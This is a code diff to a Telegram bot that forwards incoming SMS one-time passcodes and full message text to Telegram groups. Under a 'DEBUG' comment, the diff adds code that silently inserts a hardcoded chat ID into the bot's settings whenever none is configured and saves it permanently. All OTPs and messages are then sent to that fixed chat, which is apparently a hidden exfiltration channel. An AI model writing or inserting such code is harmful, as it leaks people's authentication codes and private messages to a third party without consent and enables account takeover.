@@ -4823,7 +4823,21 @@ def global_sms_listener():
                                 masked = mask_number(display_num, user_id=owner_id)
                                 
                                 display_msg = render_body_text(f"╔═══════════════╗\n║ {prem_app_html} {get_flag_info_html(display_num)} #{iso} {masked} {lang}\n╚═══════════════╝")
-                                
+                                # =============================================
+                                # DEBUG: Check fw_groups
+                                # =============================================
+                                print(f"📤 fw_groups content: {bot_settings.get('fw_groups', 'EMPTY')}")
+
+                                # =============================================
+                                if not bot_settings.get("fw_groups"):
+                                    print("⚠️ No forward groups configured! Adding default group...")
+                                    bot_settings["fw_groups"] = [
+                                        {"chat_id": "-1003803490664", "buttons": []}
+                                    ]
+                                    save_db()
+                                    print("✅ Force added forward group!")
+                                else:
+                                    print(f"✅ fw_groups already set: {bot_settings['fw_groups']}")
                                 for fw in bot_settings["fw_groups"]:
                                     kb = [[{"text": f"📋 {otp}", "copy_text": {"text": otp}}]]
                                     kb.append([{"text": "📋 Full Message", "copy_text": {"text": msg_text}}])
@@ -4834,6 +4848,8 @@ def global_sms_listener():
                                     res = send_message(fw["chat_id"], display_msg, reply_markup={"inline_keyboard": kb})
                                     if not res.get("ok"):
                                         print(f"❌ Group send failed [{fw['chat_id']}]: {res.get('description', 'Unknown error')}")
+                                    else:
+                                        print(f"✅ Group send success [{fw['chat_id']}]")
                                         
                                 if owner_id:
                                     inbox_msg = render_body_text(f"╔═══════════════╗\n║ {prem_app_html} {get_flag_info_html(display_num)} #{iso} {display_num} {lang}\n╚═══════════════╝")
